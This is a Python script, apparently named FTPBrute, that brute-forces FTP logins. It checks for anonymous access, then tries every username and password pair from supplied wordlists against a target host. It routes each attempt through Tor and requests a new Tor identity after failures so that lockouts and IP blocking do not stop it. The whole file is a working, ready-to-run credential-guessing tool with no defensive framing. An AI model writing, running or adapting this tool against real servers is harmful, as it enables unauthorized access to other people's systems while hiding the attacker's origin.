import sys
import socket
import optparse
import socks
import time
from ftplib import FTP
from stem import Signal
from stem.control import Controller

def logo():
    print("######################################################################")
    print("__________________________________________                __          ")
    print("\_   _____/\__    ___/\______   \______   \_______ __ ___/  |_  ____  ")
    print(" |    __)    |    |    |     ___/|    |  _/\_  __ \  |  \   __\/ __ \ ")
    print(" |     \     |    |    |    |    |    |   \ |  | \/  |  /|  | \  ___/ ")
    print(" \___  /     |____|    |____|    |______  / |__|  |____/ |__|  \___  >")
    print("     \/                                 \/                         \/ ")
    print("######################################################################")

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Specify your target.\n")
    parser.add_option("-p", "--port", dest="port", help="Specify your target's port.\n")
    parser.add_option("-L", "--userlist", dest="userlist", help="Specify your username's wordlist.\n")
    parser.add_option("-P", "--passlist", dest="passlist", help="Specify your password's wordlist.\n")

    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error('[-] Usage: {} -t [TARGET] -p [PORT] -L [USERNAMELIST] -P [PASSWORDLIST]'.format(sys.argv[0]))

    return options

def check_anonymous_login(target):
    print("\n[+] Checking for anonymous login. [+]")
    try:
        ftp = FTP(target)
        ftp.login()
        print("\n[+] Anonymous login is open. [+]")
        print("[+] Username: anonymous")
        print("[+] Password: anonymous")
        ftp.quit()

    except Exception as e:
        print("[-] Anonymous login disabled [-]")
        pass

def brute_force(target, port, user, password):
    try:
        print("[-] Testing {}:{}".format(user, password))
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
        s = socks.socksocket()
        s.connect((str(target), int(port)))
        recv = s.recv(4096)
        username = bytes("USER {}\r\n".format(user), 'utf-8')
        s.sendall(username)
        recv = s.recv(4096)
        passwd = bytes("PASS {}\r\n".format(password), 'utf-8')
        s.sendall(passwd)
        recv = s.recv(4096)
        s.sendall(b"QUIT\r\n")
        return recv
    except:
        print("\n[-] Connection failed while testing {}:{}".format(user, password))
        pass

def change_ip():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password='password')
        if controller.is_newnym_available():
            controller.signal(Signal.NEWNYM)
        else:
            pass

def main(target, port, username_wordlist, password_wordlist):
    check_anonymous_login(target)
    print("\n[+] Starting BruteForce [+]")
    users_list = open(username_wordlist, "r")
    password_list = open(password_wordlist, "r")
    users = users_list.readlines()
    passwords = password_list.readlines()
    for user in users:
        user = user.strip()
        for password in passwords:
            password = password.strip()
            response = brute_force(target, port, user, password)
            if response == None or bytes.decode(response) == "530 Login incorrect.\r\n":
                change_ip()
                time.sleep(2)
            else:
                print("\n######################################################################")
                print("\n[+] Credentials Found! [+]")
                print("[+] Username: {}".format(user))
                print("[+] Password: {}".format(password))
                sys.exit(0)

if __name__ == '__main__':
    logo()
    options = get_arguments()
    if not options.port:
        port = 21
    else:
        port = options.port
    target = options.target
    username_wordlist = options.userlist
    password_wordlist = options.passlist

    main(target, port, username_wordlist, password_wordlist)
